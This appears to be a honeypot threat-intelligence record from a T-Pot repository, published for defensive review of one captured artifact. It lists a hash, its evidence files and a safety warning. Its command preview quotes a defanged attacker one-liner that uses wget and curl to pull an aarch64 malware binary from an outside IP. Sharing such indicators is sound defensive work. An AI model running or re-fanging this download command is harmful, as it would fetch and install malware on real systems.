# 039a321462f98c9bb5e0ff6adf523fe8e28e87c36c3aa90b4192a6b1598386fc

High-signal T-Pot artifact published for human review.

## Summary

| Field | Value |
|---|---|
| SHA256 | `039a321462f98c9bb5e0ff6adf523fe8e28e87c36c3aa90b4192a6b1598386fc` |
| Source | T-Pot / Oraculo SOC legacy review |
| Status | high-signal candidate |
| Evidence | commands, iocs, metadata |

## Why it is visible

This artifact matched useful defensive signals such as downloader behavior, command execution, IOC presence, metadata, or detection notes.

It is published here so the repository shows the actual observed volume instead of hiding everything behind a summary.

## Command preview

```text
wget hxxp://41[.]216[.]189[.]XXX/bins/xnxnxnxnxnxnxnxnaarch64xnxn; curl -O hxxp://41[.]216[.]189[.]XXX/bins/xnxnxnxnxnxnxnxnaarch64x
```

## Evidence files

- `evidence/commands.defanged.txt`
- `evidence/iocs.defanged.json`
- `metadata/metadata.json`
- `detections.md`

Some files may be absent when the original artifact did not include that specific evidence type.

## Safety

Commands and IOCs are defanged for public defensive review. Do not execute captured payload material.
